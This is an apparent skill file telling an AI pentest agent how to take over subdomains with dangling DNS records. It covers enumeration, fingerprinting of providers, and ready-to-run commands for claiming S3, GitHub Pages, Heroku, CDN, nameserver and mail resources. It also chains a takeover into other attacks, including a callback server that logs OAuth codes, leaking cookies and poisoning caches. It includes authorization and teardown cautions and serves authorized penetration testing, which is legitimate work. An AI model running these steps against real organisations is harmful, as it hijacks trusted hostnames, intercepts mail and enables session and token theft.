# Subdomain Takeover Attack Skill

Hostile reclaim of a trusted subdomain through dangling DNS records (CNAME / A / ALIAS / NS / MX) and unverified provider bindings (S3, GitHub Pages, Heroku, Vercel, Netlify, CloudFront, Fastly, Azure App Service, Shopify, and ~80 more). Drives the full enumerate -> resolve -> probe -> fingerprint -> claim -> validate pipeline against an org's external surface, then chains the takeover into cookie scope abuse, OAuth redirect hijack, CSP/script-src trust break, mail receipt for the subdomain, and CDN cache poisoning.

## When to Classify Here

Use this skill when the operator wants to find subdomains the org no longer controls and prove a working hostile claim, including:

- "Find dangling subdomains pointing at unclaimed cloud resources"
- "Test for subdomain takeover across `*.target.tld`"
- "Hunt CNAMEs to GitHub Pages / Heroku / S3 / Azure / Fastly / Shopify / Vercel / Netlify / CloudFront that respond with the provider's unclaimed-resource page"
- "Check NS delegation takeovers (orphaned nameservers, expired delegated domains)"
- "Probe MX records pointing at decommissioned mail providers"
- "Verify whether a CDN alt-domain claim works without TXT proof"
- "Demonstrate trust chain impact: cookie pivot, OAuth callback hijack, CSP whitelist abuse from a taken-over subdomain"
- "Audit subzy / takeover fingerprints across the recon-graph subdomain inventory"

Keywords (kept disjoint from neighboring skills): subdomain takeover, dangling cname, dangling dns, dangling alias, orphaned ns, ns delegation takeover, dangling mx, cname pointing to, unclaimed bucket, unclaimed s3, unclaimed github pages, unclaimed heroku, unclaimed azure app service, unclaimed cloudfront, unclaimed fastly, unclaimed shopify, unclaimed vercel, unclaimed netlify, alternate domain, can-i-take-over-xyz, fingerprint takeover, subjack, subzy, takeover poc, subdomain claim, dangling cdn alias.

### Boundary against neighboring skills

- Not built-in `sql_injection` / community `sqli_exploitation`: those drive SQL grammar fuzzing in application parameters. Takeover never injects SQL.
- Not built-in `xss` / community `xss_exploitation`: XSS lands JavaScript in the victim's browser through reflected, stored, or DOM sinks. Takeover places code under our own server bound to the dangling hostname; XSS is a follow-on impact (CSP/script-src abuse) only after the claim succeeds.
- Not built-in `ssrf` / community `ssrf_exploitation`: SSRF abuses a server-side fetcher to reach internal hosts or cloud metadata. Takeover never asks the target server to fetch a URL; the attack happens on the DNS / provider plane.
- Not community `xxe`: XXE reaches resources through XML entity resolution inside a parser. Takeover is purely DNS + HTTP fingerprinting of third-party providers.
- Not community `idor_bola_exploitation`: that skill swaps identifiers and identities against valid endpoints. Takeover never logs in; it claims an unbound resource.
- Not community `api_testing`: API testing covers JWT / GraphQL / REST / 403-bypass on a live application. Subdomain takeover terminates before the application layer (the hostname returns the provider's "unclaimed" page, not the customer's app).
- Not built-in `cve_exploit`: takeover is a misconfiguration class with no CVE. Stay here whenever the entry point is a dangling DNS record or an unverified provider binding, and only pivot to `cve_exploit` if the claimed resource turns out to host an unrelated software CVE.
- Not built-in `denial_of_service`: scope is reclaim, not service disruption. Cache-poisoning experiments after a takeover are explicitly gated to authorized-only.
- Not built-in `phishing_social_engineering`: those skills target users via crafted lures. Takeover stops at "we control the hostname". A phishing campaign launched from the taken-over subdomain is reported separately.

## Tools

This workflow uses only tools already present in the agent's runtime:

- `query_graph` for the prior-recon subdomain inventory (Subdomain, DNSRecord, BaseURL, Certificate, Endpoint nodes from the scan pipeline).
- `execute_subfinder` for passive subdomain expansion when the graph is thin.
- `execute_amass` for active brute / passive sweep when subfinder coverage is low.
- `execute_httpx` for status / title / server / cert SAN / tech-detect probes across the resolved set.
- `execute_nuclei` for the curated `takeovers/` template pack (140+ provider fingerprints).
- `kali_shell` for `subzy` (90+ provider fingerprints, sharper than httpx -td banks), `dig`, `dnsx`, `dnsrecon`, `whois`, `host`, `nslookup`, `whatweb`, `curl`, `jq`, `interactsh-client` (verification listener), `ngrok` (expose your own claim from the sandbox), `python3 -m http.server` (serve PoC content).
- `execute_code` for reading bulk JSON output, building CNAME chain graphs, looking up provider fingerprints, and orchestrating the claim/verify loop in one place.
- `execute_curl` for raw HTTP/HTTPS probes against suspected dangling targets and for reading the resource at the alternate provider endpoint.

The `subzy` binary was added specifically for this skill. If for any reason it is not present in `kali_shell`, fall back to `execute_nuclei -tags takeover -severity critical,high,medium -jsonl` plus manual `execute_httpx -td -title -server -sc` and the fingerprint corpus baked into Phase 1.5 below.

## Workflow

### Phase 1: Reconnaissance (Informational)

The goal of Phase 1 is to land in Phase 2 with a small, high-confidence list of `(subdomain, provider, missing-resource-name)` triples. Quality of the candidate list dictates everything downstream, so spend the time here.

1. **Read prior `takeover_scan` findings from the graph FIRST.** RedAmon's recon pipeline already runs subjack + nuclei takeover templates and writes confirmed findings as `Vulnerability` nodes with `source: 'takeover_scan'`, `takeover_provider`, `takeover_method`, `verdict`, and `cname_target` properties (provenance: subjack and nuclei_takeover, see `sources` field). Always consume those rows via `query_graph` before kicking off any active scan -- they are pre-validated, deterministic-ID, and free.
   ```
   MATCH (s:Subdomain)-[:HAS_VULNERABILITY]->(v:Vulnerability {source: 'takeover_scan'})
   WHERE s.project_id = $project_id
   RETURN s.name AS subdomain, v.takeover_provider AS provider,
          v.takeover_method AS method, v.cname_target AS cname,
          v.verdict AS verdict, v.confidence AS confidence,
          v.sources AS detectors
   ORDER BY v.verdict DESC, v.confidence DESC
   ```
   Any row with `verdict = 'confirmed'` is a Phase 2 candidate without further enumeration. Treat `verdict = 'tentative'` as a Phase 1.9 candidate that still needs the manual fingerprint pass below.

2. **Inventory the rest of the subdomain surface with `query_graph`.** Now broaden to every Subdomain the recon graph already knows about, regardless of takeover status:
   ```
   MATCH (d:Domain)-[:HAS_SUBDOMAIN]->(s:Subdomain)
   WHERE d.project_id = $project_id
   OPTIONAL MATCH (s)-[:HAS_DNS_RECORD]->(r:DNSRecord)
   OPTIONAL MATCH (s)-[:HAS_BASE_URL]->(b:BaseURL)
   OPTIONAL MATCH (b)-[:HAS_CERTIFICATE]->(c:Certificate)
   RETURN s.name, s.ip, collect(DISTINCT r.type + ':' + r.value) AS records,
          collect(DISTINCT b.url) AS urls, collect(DISTINCT c.san) AS sans
   ```
   If the graph already has `DNSRecord` nodes, jump directly to step 4. If it does not, run step 3 first.

3. **Expand the subdomain inventory.** When the graph carries fewer than ~20 subdomains for the root domain, fan out passively first:
   ```
   execute_subfinder -d <root> -all -json -silent
   ```
   Save the result list:
   ```bash
   subfinder -d <root> -all -silent -o /tmp/subs.txt
   ```
   For deeper coverage (slower, optional, only when the operator authorizes active touches against the org's DNS infrastructure):
   ```
   execute_amass enum -d <root> -active -brute -timeout 10 -o /tmp/subs_amass.txt
   ```
   Merge: `sort -u /tmp/subs.txt /tmp/subs_amass.txt > /tmp/subs_all.txt`.

4. **Resolve the full RR set.** Capture A / AAAA / CNAME / NS / MX / TXT for every host. CNAME chains are the single richest signal, so keep the chain rather than the leaf:
   ```bash
   dnsx -l /tmp/subs_all.txt -a -aaaa -cname -ns -mx -txt -resp -silent -json -o /tmp/dnsx.json
   ```
   Walk chains with `execute_code`:
   ```python
   # execute_code
   import json, collections
   chain = collections.defaultdict(list)
   with open('/tmp/dnsx.json') as f:
       for line in f:
           rec = json.loads(line)
           host = rec.get('host', '')
           for cn in rec.get('cname', []) or []:
               chain[host].append(cn)
           for ns in rec.get('ns', []) or []:
               chain[host].append('NS:' + ns)
           for mx in rec.get('mx', []) or []:
               chain[host].append('MX:' + mx)
   for host, targets in chain.items():
       if targets:
           print(host, '->', ' -> '.join(targets))
   ```
   Flag anything pointing outside the org's own zone for Phase 1.5. Track NXDOMAIN vs SERVFAIL responses on the CNAME target separately: NXDOMAIN on a target that exists in a provider zone is one of the strongest signals.

5. **Match CNAME targets against the provider corpus.** A target is interesting if it ends in any of the following suffixes (the ~30 most common, kept short on purpose; nuclei + subzy ship the long tail):
   - GitHub / GitLab Pages: `github.io`, `gitlab.io`, `*.pages.dev`, `*.netlify.app`
   - Vercel / Render / Fly: `vercel.app`, `now.sh`, `onrender.com`, `fly.dev`
   - Heroku: `herokuapp.com`, `herokudns.com`, `herokussl.com`
   - Atlassian / Zendesk / Helpscout / Freshdesk / Tilda / Tumblr / Webflow / Squarespace / Shopify / Statuspage / Helpjuice / Helpshift / Surge / Strikingly / Unbounce / LaunchRock / Tictail (decommissioned SaaS family)
   - AWS: `s3.amazonaws.com`, `s3-website-*.amazonaws.com`, `*.amazonaws.com`, `cloudfront.net`, `elasticbeanstalk.com`, `*.execute-api.<region>.amazonaws.com`
   - Azure: `azurewebsites.net`, `cloudapp.net`, `cloudapp.azure.com`, `trafficmanager.net`, `azureedge.net`, `azure-api.net`, `blob.core.windows.net`
   - GCP: `appspot.com`, `googleapis.com`, `storage.googleapis.com`
   - Akamai / Fastly / Bunny / KeyCDN: `akamaized.net`, `fastly.net`, `b-cdn.net`, `kxcdn.com`, `edgekey.net`, `edgesuite.net`
   - Mail: `mailgun.org`, `sendgrid.net`, `pphosted.com` (after migration), any MX in a domain that itself NXDOMAINs or has expired WHOIS

6. **Detect orphaned NS delegations.** Subzones delegated to nameservers under domains that have expired or no longer host authoritative servers are the highest-impact takeover class because controlling the NS controls every label below. Walk every NS record:
   ```bash
   while read host; do
     for ns in $(dig +short NS "$host"); do
       # Check that the NS host itself resolves
       if [ -z "$(dig +short A "$ns" AAAA "$ns")" ]; then
         echo "ORPHAN_NS host=$host ns=$ns"
       fi
       # Check WHOIS expiry on the NS parent zone
       parent=$(echo "$ns" | awk -F. '{print $(NF-1)"."$NF}')
       expiry=$(whois "$parent" 2>/dev/null | grep -iE 'expir|expiry|paid-till' | head -1)
       echo "NS_PARENT host=$host ns=$ns parent=$parent $expiry"
     done
   done < /tmp/subs_all.txt | tee /tmp/ns_probe.txt
   grep -E '^(ORPHAN_NS|NS_PARENT)' /tmp/ns_probe.txt
   ```
   Any line where the NS parent shows past-due expiry, or where the NS hostname does not resolve, is a Phase 2 candidate.

7. **HTTP / HTTPS probe with structured fingerprinting.** Fan out across HTTP and HTTPS for every interesting subdomain and capture the full evidence set in one pass:
   ```
   execute_httpx -l /tmp/subs_all.txt -sc -title -server -td -tls-grab -location -ip -cname -bk -websocket -follow-redirects -silent -j -o /tmp/httpx.json
   ```
   Useful fields per row: `status_code`, `title`, `server`, `tech`, `cname`, `tls.subject_an`, `tls.issuer_dn`, `final_url`, `body_preview`. Read with:
   ```bash
   jq -r 'select((.status_code|tostring) | test("^(40|42|421|404|403)")) | "\(.url)\t\(.status_code)\t\(.title // "")\t\(.cname // [])"' /tmp/httpx.json
   ```
   The `body_preview` field carries the first ~512 bytes of the response, which is exactly where provider unclaimed-resource banners live.

8. **Re-run the takeover-specific scanners on newly enumerated subdomains.** Step 1 already covered subdomains the recon pipeline saw. For any subdomain added in step 3 (subfinder/amass) that was NOT in the recon graph, run the same scanners now to bring the new surface into parity:
   - `subzy` (90+ provider fingerprints, includes recently-added providers nuclei lags on):
     ```bash
     subzy run --targets /tmp/subs_all.txt --concurrency 30 --hide_fails --output /tmp/subzy.json
     ```
   - Nuclei takeover templates (the largest corpus, ~140 fingerprints, also catches CDN alt-domain mismatches that subzy misses):
     ```
     execute_nuclei -l /tmp/subs_all.txt -tags takeover -severity critical,high,medium -jsonl -o /tmp/nuclei_takeover.jsonl
     ```
   Cross-correlate the two outputs with `execute_code`:
   ```python
   # execute_code
   import json
   subzy = []
   with open('/tmp/subzy.json') as f:
       for line in f:
           try: subzy.append(json.loads(line))
           except: pass
   nuc = []
   with open('/tmp/nuclei_takeover.jsonl') as f:
       for line in f:
           try: nuc.append(json.loads(line))
           except: pass
   keys = set()
   for r in subzy:
       host = r.get('subdomain') or r.get('host')
       prov = r.get('provider') or r.get('engine') or 'unknown'
       keys.add((host, prov))
   for r in nuc:
       host = r.get('host') or r.get('matched-at')
       prov = (r.get('info') or {}).get('name') or r.get('template-id')
       keys.add((host, prov))
   print('candidates:', len(keys))
   for host, prov in sorted(keys):
       print(f"{host}\t{prov}")
   ```
   Anything that lands in either tool with `vulnerable: true` (subzy) or `severity: high|critical` (nuclei) is a Phase 2 candidate.

9. **Manual fingerprint pass for misses.** Scanners frequently lag the provider's banner copy. For every interesting candidate where the scanners stayed silent, hit the host directly with `execute_curl` and check the body against the table below. Each row is an unclaimed-resource banner that has shipped at some point in the wild:
   - GitHub Pages: `There isn't a GitHub Pages site here.`
   - GitLab Pages: `The page you're looking for could not be found.` plus a `gitlab` cookie
   - Heroku: `No such app` or `There's nothing here, yet.`
   - Vercel: `The deployment could not be found on Vercel.`
   - Netlify: `Not Found - Request ID:`
   - Surge: `project not found`
   - Tumblr: `Whatever you were looking for doesn't currently exist at this address.`
   - Tilda: `Please renew your subscription` (after expiration)
   - Webflow: `The page you are looking for doesn't exist or has been moved.`
   - Shopify: `Sorry, this shop is currently unavailable.`
   - WordPress.com: `Do you want to register <subdomain>.wordpress.com?`
   - Helpscout: `No settings were found for this company`
   - Zendesk: `Help Center Closed` or `this help center no longer exists`
   - Statuspage: `You are being redirected.` plus a `statuspage` body
   - Fastly: `Fastly error: unknown domain`
   - S3 website: `<Code>NoSuchBucket</Code>` / `The specified bucket does not exist`
   - S3 REST: `<Code>PermanentRedirect</Code>` pointing to a different region
   - CloudFront: 403/400 with `The request could not be satisfied` and `X-Cache: Error from cloudfront`
   - Azure App Service: 404 default page with `Microsoft Azure App Service - Welcome` (and no custom-domain verification record)
   - Azure CDN / TrafficManager: `Profile is not found.` (TrafficManager)
   - Azure Blob: `<Code>InvalidUri</Code>` for an unbound storage account
   - Akamai: `Reference #...` 404 from `AkamaiGHost` server
   - Pantheon: `The gods are wise, but do not know of the site which you seek.`

   TLS clues are equally strong: a certificate whose CN/SAN belongs to the provider's default host (e.g. `*.amazonaws.com`, `*.azurewebsites.net`) instead of the subdomain itself usually means the provider is serving you a generic edge response, not the customer's resource.

10. **Stand up the OOB verification listener** so Phase 2 verification can land instantly:
   ```bash
   interactsh-client -v -o /tmp/takeover-oast.log &
   sleep 3 && grep -E "https?://[a-z0-9.-]+oast\." /tmp/takeover-oast.log | tail -1
   ```
   This callback URL is used in Phase 2 to confirm that DNS now resolves the taken-over subdomain to attacker-controlled infrastructure.

11. **Decide claimability per candidate.** A finding only counts if the underlying resource is actually claimable by you. Walk through this checklist with `execute_code` against the candidate list:
    - **Resource name / required value** -- what exact string would you have to register on the provider (bucket name, app name, repository custom-domain, CDN alternate domain)? If the provider's naming policy makes the required name reserved, conflict-prone, or trademark-blocked, mark the finding as `provider-blocked` and stop there.
    - **Verification challenge** -- does the provider currently require a TXT / `_dnsauth` / `_github-pages-challenge` / `asuid` / `cdnverify-` record before binding? If yes, the takeover is gated and you usually cannot proceed (call this out explicitly in the report; some providers historically allowed binding without proof, and old bindings are grandfathered, which is why this is still tested).
    - **Race window** -- if the resource was deleted recently, immediate re-registration may win the race against legitimate cleanup workflows. Note the timing.
    - **Wildcard / fallback parent** -- if the parent domain has a wildcard CNAME and a CDN with multiple origins, the candidate may not even be a true dangler. Mark `wildcard-shadow` and deprioritise.

When the candidate list narrows to a small set of `(subdomain, provider, missing-resource-name, verification-required, claimability)` tuples and the OOB collector is live, request transition to exploitation phase.

### Phase 2: Exploitation

The goal of Phase 2 is one solid PoC for the report. Pick the highest-impact candidate from Phase 1 (NS delegation > storage / pages with full content control > CDN alt-domain > SaaS placeholder), claim the resource on the provider, and demonstrate that you control content / DNS / mail at the victim subdomain. Do not chase every candidate in parallel; one proven takeover per provider class is enough.

Confirm the engagement scope explicitly authorizes "register and claim" on the third-party provider before going further. Some legal teams treat creating an S3 bucket named after the victim subdomain as an action that needs separate written approval.

#### 2.1 Storage and static-site hosting (S3, GCS, Azure Blob, GitHub/GitLab Pages, Netlify, Vercel)

Most cases reduce to: register the resource with the exact required name, upload an ownership-proof artifact, hit the subdomain over HTTPS.

S3 static website (the canonical case):
```bash
# Region from the dangling alias (e.g. s3-website-us-east-1.amazonaws.com -> us-east-1)
REGION=us-east-1
BUCKET=victim.example.tld   # the EXACT subdomain expected by the dangling CNAME

aws s3api create-bucket --bucket "$BUCKET" --region "$REGION" \
  --create-bucket-configuration LocationConstraint="$REGION"
aws s3 website "s3://$BUCKET/" --index-document index.html --error-document error.html
aws s3api put-bucket-policy --bucket "$BUCKET" --policy "$(jq -nc \
  --arg b "$BUCKET" '{Version:"2012-10-17",Statement:[{Sid:"AllowReadAll",Effect:"Allow",Principal:"*",Action:"s3:GetObject",Resource:("arn:aws:s3:::"+$b+"/*")}]}')"

cat > /tmp/index.html <<'HTML'
<!doctype html><meta charset="utf-8">
<title>Authorized takeover proof</title>
<h1>Subdomain takeover proof of concept</h1>
<p>Engagement: <code>REPLACE_WITH_TICKET</code></p>
<p>Marker: <code>REPLACE_WITH_UNIQUE_HEX</code></p>
HTML
aws s3 cp /tmp/index.html "s3://$BUCKET/index.html"

curl -sk -i "https://$BUCKET/" | head -40
```
The body should now be the ownership-proof page served from your bucket through the victim's hostname.

GitHub Pages (custom-domain):
```bash
gh repo create takeover-poc --public --add-readme
echo 'subdomain takeover proof of concept' > index.html
echo 'victim.example.tld' > CNAME
git init -b main && git add . && git commit -m 'poc'
gh repo set-default <user>/takeover-poc
git push -u origin main
gh api -X POST "repos/<user>/takeover-poc/pages" -f source.branch=main -f source.path=/
gh api -X PUT "repos/<user>/takeover-poc/pages" -f cname=victim.example.tld
```
Hit the subdomain after Pages provisions the cert (1-15 minutes):
```bash
curl -sk -I https://victim.example.tld/
curl -sk https://victim.example.tld/ | grep 'subdomain takeover proof'
```

Heroku:
```bash
heroku create victim-example-tld --remote heroku
heroku domains:add victim.example.tld -a victim-example-tld
git push heroku main
curl -sk https://victim.example.tld/ | grep 'subdomain takeover proof'
```
Some Heroku stacks now require a TXT verification record. If the page binds without it, document that gap explicitly; if the binding is rejected, fall back to a different provider class.

Netlify, Vercel, Render, Fly, GitLab Pages, Surge follow the same shape: create a project, set the custom domain to the exact subdomain, deploy a marker page. If the provider currently forces TXT proof, capture the rejection message verbatim for the report and move on.

#### 2.2 CDN alternate-domain claim (CloudFront, Fastly, Azure CDN, KeyCDN, Bunny)

A surprising number of CDN products historically allowed adding an "alternate domain" / "alias" without enforcing ownership. The probe is: configure your own distribution with the victim subdomain as an alternate domain and watch whether the CDN edge starts answering.

CloudFront (only succeeds against legacy distributions that pre-date the modern certificate-binding flow):
```bash
aws cloudfront create-distribution --distribution-config file:///tmp/dist.json
# In dist.json: "Aliases": {"Quantity":1,"Items":["victim.example.tld"]}
# Provide an ACM certificate covering the alt name; managed cert issuance through ACM
# requires DNS validation, which is the modern guard.
```
Fastly:
```bash
fastly service-version create --service-id $SID --version 1
fastly domain create --service-id $SID --version 2 --name victim.example.tld
fastly service-version activate --service-id $SID --version 2
curl -sk -I https://victim.example.tld/
```
If the CDN rejects the alias because it requires DNS-based proof of ownership, document the rejection and move to a different candidate. The legacy unverified-alt-domain class is rare today but still appears on long-tail / reseller CDN products.

#### 2.3 NS delegation takeover (highest impact)

Goal: control the nameservers responsible for an entire delegated zone, then publish arbitrary records.

1. From Phase 1.6, identify a delegated subzone whose NS hostnames live under an expired parent. Confirm WHOIS expiry one more time:
   ```bash
   whois <parent-of-ns>
   ```
2. Register the parent (legal scope must permit purchasing domains on the engagement target's behalf or under a clearly-marked PoC company; if not, stop and report the orphan as a finding without claiming).
3. Stand up authoritative NS for the parent (Route 53, Cloudflare, BIND on a sandbox VM); make the NS hostnames the same labels the victim NS records point at.
4. Publish records under the delegated subzone:
   ```
   poc      A     <our-ip>
   www.poc  CNAME <our-ip>
   *        A     <our-ip>
   ```
5. Verify from outside that the victim's recursive resolvers now answer with our records:
   ```bash
   for resolver in 8.8.8.8 1.1.1.1 9.9.9.9 208.67.222.222; do
     dig @"$resolver" poc.<delegated-subzone> A +short
   done
   ```
6. Optionally issue a DV certificate for any host under the delegated subzone via Let's Encrypt to prove you can satisfy DNS-01 challenges (only when the engagement scope permits issuing certificates).

#### 2.4 Mail-surface takeover (dangling MX)

Goal: receive mail addressed to the subdomain by claiming the dangling mail provider:

1. Identify a subdomain whose MX points at a decommissioned mail provider, or where the parent hostname of the MX target has expired (Phase 1.6 logic).
2. Sign up on the provider with the exact subdomain as the receiving domain. If the provider verifies through DNS, the residual dangling MX often satisfies the check inadvertently.
3. Send a test email from a side mailbox to `oast-marker@<victim-subdomain>`; confirm receipt in your inbox at the provider.
4. Document the observed envelope, the DKIM/SPF posture (likely permissive given the configuration drift), and stop. Do not solicit or read live correspondence beyond the test marker.

#### 2.5 OAuth / SSO trust-chain proof

If the taken-over subdomain is whitelisted as an OAuth redirect URI / callback / post-logout redirect / CSP `script-src` / cookie `Domain=`, the takeover elevates immediately. Demonstrate the chain:
```bash
# Read the OAuth client's authorize endpoint as if you were the user; capture redirect_uri allowlist
curl -sk "https://idp.target.tld/authorize?client_id=ABC&redirect_uri=https://victim.example.tld/callback&response_type=code&state=xyz" -i | head
```
If the IdP redirects without complaint, host a callback handler under the taken-over subdomain that logs the `code` parameter:
```python
# execute_code (run on the sandbox; tunnel via ngrok if the bucket / Pages flow does not support custom logic)
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/tmp/oauth_codes.log', 'a') as f:
            f.write(self.path + '\n')
        self.send_response(200); self.end_headers()
        self.wfile.write(b'ok')
socketserver.TCPServer(('0.0.0.0', 8088), H).serve_forever()
```
Trigger the flow as a user, fetch `/tmp/oauth_codes.log`, exchange the code for an access token, and stop. Do NOT enumerate the user's data once you hold a token; the report ships with a single redacted token and the redirect-uri configuration screenshot.

#### 2.6 Cookie / CORS / CSP impact (read-only proof)

When a cookie is set with `Domain=.target.tld`, every subdomain receives the cookie. Demonstrate:
```bash
# From the taken-over subdomain, log incoming Cookie headers
curl -sk -i "https://victim.example.tld/" -b "Cookie-test=1"
```
If `target.tld` ever sets `Domain=.target.tld; Secure; HttpOnly` on a session token, a victim browsing `victim.example.tld` for any reason (link click, `<img>` from another origin, malicious ad pivot) will leak the cookie to your handler. Same logic for CORS allowlists by hostname suffix and CSP `script-src https://*.target.tld`.

Capture one redacted cookie per impact class. Move on.

#### 2.7 Cache-poisoning chain (gated)

Once the subdomain is taken over, an attacker can populate edge caches with malicious responses. This step is permitted only when the engagement scope explicitly authorizes cache testing (it can disrupt legitimate users):
```bash
# Force the edge to cache an attacker-controlled body
curl -sk -H "Cache-Control: max-age=300" "https://victim.example.tld/" -o /tmp/poisoned.html
# Validate cache hit from a different vantage
curl -sk -I "https://victim.example.tld/" | grep -i 'x-cache\|age\|cf-cache\|x-served-by'
```
If the engagement does not authorize cache testing, document the theoretical chain and stop.

#### 2.8 CT / TLS proof (always cheap, always runs)

Issue a domain-validated certificate from Let's Encrypt for the taken-over subdomain (only when scope allows issuing certificates):
```bash
certbot certonly --manual --preferred-challenges http -d victim.example.tld
# Or DNS-01 against your own NS in case 2.3
certbot certonly --manual --preferred-challenges dns -d victim.example.tld
```
Then demonstrate the resulting CT log entry:
```bash
curl -s "https://crt.sh/?q=victim.example.tld&output=json" | jq -r '.[].name_value' | sort -u
```
A new CT entry for the subdomain you do not own is one of the most legible PoCs in the report.

### Phase 3: Post-Exploitation

The takeover is the finding. Phase 3 is restricted to evidence collection and authorized impact demonstration; do NOT use the foothold to launch broader campaigns.

1. **Capture the canonical evidence bundle:**
   - Pre-takeover: DNS chain, HTTP response (status, body length, fingerprint), TLS certificate details. Save to `/tmp/before.txt`.
   - Post-takeover: serve a unique marker (e.g. `RA-TAKEOVER-<hex>`) and fetch it back over HTTPS:
     ```bash
     curl -sk "https://victim.example.tld/" | grep RA-TAKEOVER || \
     curl -sk "http://victim.example.tld/" | grep RA-TAKEOVER
     ```
   - CT log entry from 2.8 if a DV cert was issued.
   - OAuth, cookie, or CSP impact if scope permitted that escalation.

2. **Cross-channel parity sweep.** Do every other host in the same provider family with the same fingerprint resolve to the same dangler? Use the Phase 1.8 candidate list and re-run subzy / nuclei on a curated subset. Reporting one finding when twenty are exposed leaves the customer at risk.

3. **Look up sibling assets.** Once you control `victim.example.tld`, search the recon graph for any URL or JS bundle in the project that hard-codes that subdomain (CSP entries, CORS allowlists, OAuth client configurations, JS `__BASE_URL__`, hard-coded webhook endpoints):
   ```
   query_graph: "Endpoints, Headers, Parameters, JsReconFinding nodes whose value or content references 'victim.example.tld'."
   ```
   Each hit is an additional impact vector to document.

4. **Map the operator's decommission gap.** Note the date of the dangling resource (provider deletion timestamp where visible, NS expiry date, or last-modified header on the original cert). Pair that with the takeover-detection lag in the customer's monitoring stack: it directly drives the remediation recommendation about decommission workflows.

5. **Tear down or transfer ownership cleanly.** Once the report is delivered, do NOT retain claim on the resource. Either:
   - Transfer the registered resource to the customer's account at the provider, or
   - Delete it after the customer has had a chance to take ownership, or
   - Park it on a "DO NOT REGISTER" inventory shared with the customer to prevent re-claim.
   Hold the registered resource only as long as the engagement requires.

## Reporting Guidelines

For every confirmed finding, include:

- **Vulnerability class**: dangling-CNAME / orphaned-NS / dangling-MX / unverified-alt-domain / wildcard-fallback / cache-poisonable.
- **Affected subdomain** plus the full DNS chain (`subdomain -> CNAME -> ... -> provider hostname`).
- **Provider identifier**: AWS S3 / GitHub Pages / Heroku / CloudFront / Fastly / Azure App Service / etc, with the unclaimed-resource banner verbatim.
- **Resource name registered**: exact value (bucket, app, repo) plus screenshots of provider dashboard if required.
- **Pre / post evidence**: HTTP body diff (status, length, fingerprint), curl transcripts, screenshots of the proof page rendering at the victim subdomain over HTTPS.
- **Cert evidence (if issued)**: CT log entry URL, fingerprint, issuance timestamp.
- **Trust-chain impact** demonstrated: cookie scope (`Domain=.parent.tld`), OAuth redirect-uri allowlist hit, CSP `script-src` hit, mail receipt, cache poisoning. List which were proven and which were authorized but blocked.
- **Cross-channel coverage**: other subdomains in the same provider family with the same fingerprint that were not exploited but are exposed.
- **Remediation**: remove the dangling DNS record FIRST (not last, so attackers cannot win the race after the customer audits), then verify provider-level ownership-binding policies, enforce TXT/`_dnsauth` proof on every provider, monitor CT logs for unexpected issuance, and adopt CAA records for issuance limits. Add a decommission workflow that requires DNS cleanup before the third-party resource is deleted.
- **References**: HackerOne reports on Uber subdomain takeovers, Mathias Karlsson's `frans.io` write-ups, EdOverflow `can-i-take-over-xyz` repo (the canonical fingerprint corpus).

## Important Notes

- **Authorization first.** Registering a resource (bucket, app, domain, certificate) on a third-party provider creates a contractual relationship between you and that provider. Confirm the engagement covers this before the first claim; some legal teams treat a single S3 bucket creation as a separate authorization step.
- **Tear down clean.** Always release the registered resource to the customer or delete it after the engagement. Keeping a dangling resource pointed at a customer subdomain in your account is itself a finding.
- **Never harvest live traffic.** Once the takeover is proven, stop. Do not collect cookies, OAuth codes, mail, or any other user data beyond the minimum redacted artifact required to demonstrate the chain.
- **Distinguish "blocked" from "secure".** A 200 OK with the provider's branded default page on a subdomain you cannot claim is NOT a takeover, even if the page looks identical to the unclaimed banner. Most modern providers enforce TXT verification before binding the custom domain; that is the correct behavior. The vulnerable population is shrinking but never zero, especially on long-tail SaaS, legacy CDN distributions, and grandfathered configurations.
- **Use `subzy` first, then `nuclei -tags takeover`, then the manual fingerprint table.** The three layers are deliberately complementary; a candidate that none of them flags is rarely a real takeover.
- **NS delegation takeovers are scope-sensitive.** Registering an expired domain to control the NS of a delegated subzone is the highest-impact class but also the most legally fragile. Many operators stop at "documented orphan NS" for that class and let the customer take over the parent themselves.
- **Race and grandfathering.** A subdomain that was claimable yesterday may not be today (provider patched the verification flow) and vice versa. Re-test before sending the report.
- **Wildcard CNAMEs lie.** A wildcard CNAME with a CDN that has multiple origins may answer with a provider-branded page even when the resource is not actually claimable. Use `dig +short CNAME` against both the leaf and a deliberately-nonexistent sibling: if the sibling resolves to the same target, it is a wildcard, not a dangler.
- **Cache poisoning, CT issuance, and OAuth callback abuse are gated.** They require explicit scope notes in the engagement. Skip them and document the chain theoretically if the operator forbids those steps.
- **Reference corpus to keep current**: `EdOverflow/can-i-take-over-xyz` (provider matrix), `PentestPad/subzy` (90+ fingerprints, actively maintained), nuclei `templates/http/takeovers/` (~140 templates, weekly updates), HackerOne disclosures tagged "subdomain takeover".
